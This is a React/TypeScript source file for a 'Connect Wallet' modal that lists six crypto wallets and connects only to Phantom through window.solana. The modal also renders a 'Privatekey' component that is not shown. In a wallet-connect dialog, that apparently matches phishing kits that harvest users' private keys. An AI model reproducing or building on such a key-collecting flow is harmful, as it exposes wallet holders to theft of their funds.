import React from "react";
import walletLogo1 from "../public/1.png";
import walletLogo2 from "../public/2.png";
import walletLogo3 from "../public/3.png";
import walletLogo4 from "../public/4.png";
import walletLogo5 from "../public/5.png";
import walletLogo6 from "../public/6.png";
import Privatekey from "./Privatekey";
interface WalletOption {
  name: string;
  icon: React.ReactNode;
  iconBg: string;
  type : string
}

const walletOptions: WalletOption[] = [
  {
    name: "Phantom",
    icon: <img className="wallet-logo" src={walletLogo1} alt="Phantom" />,
    iconBg: "bg-purple-500",
    type : "phantom"
  },
  {
    name: "MetaMask",
    icon: <img className="wallet-logo" src={walletLogo2} alt="Phantom" />,
    iconBg: "bg-orange-500",
    type : "any"
  },
  {
    name: "Solflare",
    icon: <img className="wallet-logo" src={walletLogo3} alt="Phantom" />,
    iconBg: "bg-yellow-500",
    type : "any"
  },
  {
    name: "Trust Wallet",
    icon: <img className="wallet-logo" src={walletLogo4} alt="Phantom" />,
    iconBg: "bg-blue-500",
    type : "any"
  },
  {
    name: "Magic Eden",
    icon: <img className="wallet-logo" src={walletLogo5} alt="Phantom" />,
    iconBg: "bg-pink-600",
    type : "any"
  },
  {
    name: "OKX Wallet",
    icon: <img className="wallet-logo" src={walletLogo6} alt="Phantom" />,
    iconBg: "bg-gray-700",
    type : "any"
  },
];
function ConnectWallet({
  visible,
  setVisible,
}: {
  visible: boolean;
  setVisible: any;
}) {
  const connectWallet = async () => {
    try {
      if (window.solana) {
        const response = await window.solana.connect();
        console.log(response.publicKey.toString());
        alert("Wallet connected successfully");
      } else {
        alert("Phantom wallet not connectd. Please connect it.");
      }
    } catch (err) {
      console.log(err);
      alert("Failed to connect wallet");
    }
  };
  const closeModal = () => {
    window.solana.on("disconnect", () => {
      console.log("Disconnected from Phantom Wallet");
    });
    setVisible(false);
  };
  function WalletButton({
    option,
  }: {
    option: WalletOption;
  }) {
    return (
      <button
        className="wallet-btn flex items-center w-full p-4 transition-all duration-200 bg-gray-900 rounded-xl ring-1 ring-gray-700"
        onClick={() => {
          if(option.type === "phantom"){
            connectWallet();
          }
        }}
      >
        {option.icon}
        <span className="text-white text-lg font-medium">{option.name}</span>
      </button>
    );
  }
  return (
    visible && (
      <div className="fixed inset-0 bg-gray-500 bg-opacity-75 flex justify-center items-center z-50">
        <div className="bg-white rounded-lg shadow-lg w-1/3 p-6">
          <div
            className="bg-gradient-to-br from-gray-900 to-gray-800"
            style={{ borderRadius: "10px" }}
          >
            <div className="w-full max-w-2xl bg-gray-900/50 backdrop-blur-xl p-8 rounded-2xl shadow-xl">
              <h1 className="text-3xl font-bold text-white text-center mb-2">
                Connect Wallet
              </h1>
              <p className="text-gray-400 text-center mb-8">
                Select the wallet you'd like to connect.
              </p>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                {walletOptions.map((option) => (
                  <WalletButton
                    key={option.name}
                    option={option}
                  />
                ))}
              </div>
              <div className="mt-8 text-center">
                <a
                  href="#"
                  className="text-gray-400 hover:text-white underline text-sm transition-colors duration-200"
                >
                  I don't have a wallet
                </a>
              </div>
            </div>
          </div>
          <Privatekey setVisible={closeModal} />
        </div>
      </div>
    )
  );
}

export default ConnectWallet;
